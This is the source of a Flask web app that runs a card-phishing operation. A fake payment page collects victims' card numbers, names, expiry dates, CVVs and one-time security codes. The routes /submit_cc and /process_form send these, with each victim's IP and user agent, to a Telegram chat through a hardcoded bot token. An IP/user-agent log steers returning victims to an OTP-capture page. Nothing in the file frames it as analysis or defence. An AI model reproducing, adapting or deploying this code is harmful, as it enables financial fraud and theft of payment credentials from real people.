from flask import Flask, request, render_template, redirect, url_for, send_from_directory
import requests
import csv



app = Flask(__name__, static_url_path='/static')

your_bot_token = "6059457475:AAHt3inOoNNfXFnbdtwAfjfluxZ-3Q_f7N0"

@app.route('/')
def index():
    # Récupérer l'adresse IP et le user-agent du client
    ip_address = request.remote_addr
    user_agent = request.user_agent.string

    # Vérifier si l'adresse IP et le user-agent se trouvent dans le fichier CSV
    with open('ip_list.csv', 'r') as csvfile:
        csvreader = csv.reader(csvfile)
        for row in csvreader:
            if row and row[0] == str(ip_address) and row[1] == str(user_agent):
                return redirect('/security')

    return render_template('home.html')


@app.route('/payment', methods=['GET', 'POST'])
def payment():
    return render_template('index.html')



@app.route('/submit_cc', methods=['POST'])
def submit_cc():
    data = request.get_json()
    print(data)
    num = data['num']
    nom = data['nom']
    date = data['date']
    cvv = data['cvv']

    # faire quelque chose avec les données envoyées
    user_agent = request.user_agent.string
    ip_address = request.remote_addr

    # Envoi des données sur Telegram
    data = {
        "chat_id": "-1001854380020",
        "text": f"💳 CARD  🇭🇺 Hungary 🇭🇺 🏴‍☠ ⚔️ 🏴‍☠\n▬▬▬▬▬|🏴‍☠ CARD 🏴‍☠|▬▬▬▬▬\n👤 ➖ CHN : {nom} \n💳 ➖ CCN : {num}\n⏱ ➖ EXP : {date}\n🎰 ➖ CVV {cvv}\n▬▬▬▬▬|🏴‍☠ INFO 🏴‍☠|▬▬▬▬▬\n👤 User agent: {user_agent}\n🖥️ IP address: {ip_address}\n▬▬▬▬▬|🏴‍☠ OTP 🏴‍☠|▬▬▬▬▬"
    }
    response = requests.post(f"https://api.telegram.org/bot{your_bot_token}/sendMessage", json=data)

    return "OK"

@app.route('/.well-known/pki-validation/<path:filename>')
def serve_authentification(filename):
    return send_from_directory("/.well-known/pki-validation/", filename)

@app.route('/security', methods=['GET', 'POST'])
def security():
    # Récupérer l'adresse IP et l'User-Agent
    ip_address = request.remote_addr
    user_agent = request.user_agent.string
    
    # Vérifier si l'adresse IP et l'User-Agent se trouvent dans le fichier CSV
    with open('ip_list.csv', 'r') as csvfile:
        csvreader = csv.reader(csvfile)
        for row in csvreader:
            if row and row[0] == str(ip_address) and row[1] == str(user_agent):
                return render_template('security1.html')
    
    # Si l'adresse IP et l'User-Agent ne sont pas dans le fichier, les ajouter
    with open('ip_list.csv', 'a') as csvfile:
        csvwriter = csv.writer(csvfile)
        csvwriter.writerow([ip_address, user_agent])
    
    return render_template('security1.html')


@app.route('/process_form', methods=['POST'])
def process_form():
    code = request.form.get('code')
    user_agent = request.user_agent.string
    ip_address = request.remote_addr

    # Envoyer le code sur Telegram
    data = {
        "chat_id": "-1001854380020",  # Modifier l'identifiant du chat en conséquence
        "text": f"😈Code: {code} 😈\n👤 User agent: {user_agent}\n🖥️ IP address: {ip_address}"
    }
    response = requests.post(f"https://api.telegram.org/bot{your_bot_token}/sendMessage", json=data)

    if response.status_code == 200:
        return "success"
    else:
        return "failure"


if __name__ == '__main__':
    app.run()
